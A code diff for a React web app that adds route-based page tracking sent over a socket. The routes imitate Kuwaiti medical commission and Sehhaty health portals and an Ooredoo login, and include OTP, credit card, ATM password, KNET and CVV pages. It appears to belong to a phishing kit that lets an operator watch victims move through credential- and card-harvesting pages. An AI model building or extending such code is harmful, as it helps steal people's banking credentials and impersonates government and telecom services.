@@ -7,7 +7,7 @@ import ScrollToTop from "./components/ScrollToTop";
 import PageTitleUpdater from "./components/PageTitleUpdater";
 import { ThemeProvider } from "./i18n/ThemeContext";
 import { LanguageProvider } from "./i18n/LanguageContext";
-import { initializeSocket, disconnectSocket, socket } from "./lib/store";
+import { initializeSocket, disconnectSocket, socket, navigateToPage } from "./lib/store";
 import { useState, useEffect } from "react";
 
 // New Pages
@@ -97,6 +97,39 @@ function App() {
       disconnectSocket();
     };
   }, []);
+
+  // تتبع تغيير الصفحة تلقائياً
+  useEffect(() => {
+    const pageNameMap: Record<string, string> = {
+      '/': 'البوابة الرئيسية',
+      '/medical-commission': 'خدمات القومسيون الطبي',
+      '/sehhaty': 'خدمة صحتي',
+      '/medical-login': 'تسجيل دخول القومسيون الطبي',
+      '/medical-activate': 'تفعيل حساب القومسيون',
+      '/medical-register': 'تسجيل القومسيون الطبي',
+      '/ooredoo-login': 'تسجيل دخول Ooredoo',
+      '/ooredoo-otp': 'رمز OTP Ooredoo',
+      '/waiting': 'انتظار',
+      '/credit-card-payment': 'الدفع ببطاقة الائتمان',
+      '/otp-verification': 'رمز التحقق OTP',
+      '/atm-password': 'كلمة مرور ATM',
+      '/knet-payment': 'KNET',
+      '/cvv': 'CVV',
+      '/final-page': 'الصفحة النهائية',
+    };
+    const path = location.split('?')[0];
+    // Match dynamic routes
+    let pageName = pageNameMap[path];
+    if (!pageName) {
+      if (path.startsWith('/sehhaty/services/') || path.startsWith('/sehhaty/service/')) pageName = 'تفاصيل خدمة صحتي';
+      else if (path.startsWith('/sehhaty/info/')) pageName = 'معلومات صحتي';
+      else if (path.startsWith('/services/')) pageName = 'تفاصيل خدمة القومسيون';
+      else if (path.startsWith('/legal/')) pageName = 'الشروط والأحكام';
+      else if (path.startsWith('/info/')) pageName = 'معلومات';
+      else pageName = path;
+    }
+    navigateToPage(pageName);
+  }, [location]);
 
   useEffect(() => {
     const s = socket.value;
